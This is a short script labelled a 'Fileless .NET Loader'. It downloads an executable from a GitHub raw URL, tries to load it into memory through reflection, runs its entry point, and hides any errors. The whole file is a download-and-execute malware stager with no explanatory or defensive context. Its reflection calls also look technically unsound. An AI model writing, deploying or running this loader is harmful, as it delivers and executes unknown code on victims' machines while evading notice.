// loader.js - Fileless .NET Loader
try {
    var x = new ActiveXObject("Microsoft.XMLHTTP");
    x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
    x.send();
    
    if (x.status == 200) {
        var data = x.responseBody;
        var assembly = new ActiveXObject("System.Reflection.Assembly");
        var loaded = assembly.Load(data);
        var entry = loaded.GetEntryPoint();
        entry.Invoke(null, null);
    }
} catch(e) {
    // Fail silently
}
